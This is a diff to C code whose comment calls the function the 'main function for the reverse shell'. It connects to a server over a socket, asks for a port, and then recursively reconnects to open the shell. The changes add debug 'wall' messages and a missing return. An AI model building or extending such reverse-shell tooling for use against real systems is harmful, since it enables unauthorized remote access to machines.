@@ -67,7 +67,7 @@ int testpid(){
 
 //Main function for the reverse shell
 int establishConnection(int port, int shell) {
-    printf("%d\n", port);
+    system("wall here");
     //Initialize the socket
     int sock = 0, valread;
     struct sockaddr_in serv_addr;
@@ -75,6 +75,7 @@ int establishConnection(int port, int shell) {
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         return ERR;
     }
+    system("wall no here");
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(port);
     char* *str;
@@ -85,7 +86,7 @@ int establishConnection(int port, int shell) {
     if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
         return ERR;
     }
-    
+    system("wall no no here");
     // system("hi\n");
     //Test whether we should request a port from the server
     //or if we should open the reverse shell
@@ -124,7 +125,7 @@ int establishConnection(int port, int shell) {
         write(sock , "none\n" , strlen("none\n"));
         valread = read( sock , buffer, 1024);
         printf("%s", buffer);
-        establishConnection(atoi(buffer), 1);
+        return establishConnection(atoi(buffer), 1);
     }
     return 0;
 }
